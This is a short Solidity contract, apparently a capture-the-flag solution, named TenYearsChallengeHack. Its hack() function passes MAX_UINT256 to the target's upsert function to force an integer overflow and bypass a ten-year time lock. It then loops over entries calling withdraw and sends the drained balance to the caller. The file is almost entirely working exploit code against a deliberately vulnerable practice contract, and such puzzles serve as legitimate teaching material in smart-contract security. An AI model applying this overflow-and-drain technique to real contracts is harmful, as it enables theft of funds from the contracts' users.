pragma solidity ^0.7.0;

import "./TenYearsChallenge.sol";
import "hardhat/console.sol";

contract TenYearsChallengeHack {
    uint256 public constant MAX_UINT256 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;

    TenYearsChallenge public challenge;

    constructor(address addr) {
        challenge = TenYearsChallenge(addr);
    }

    receive() external payable {
    }

    function hack() public {
        challenge.upsert{value: 0}(MAX_UINT256, MAX_UINT256);
        challenge.upsert{value: 0}(MAX_UINT256, 1 days);
        uint head = challenge.head();
        for (uint256 i = head; i < head + 10; i++) {
            try challenge.withdraw(i) {
                msg.sender.transfer(address(this).balance);
                return;
            } catch {
                continue;
            }
        }
    }

}
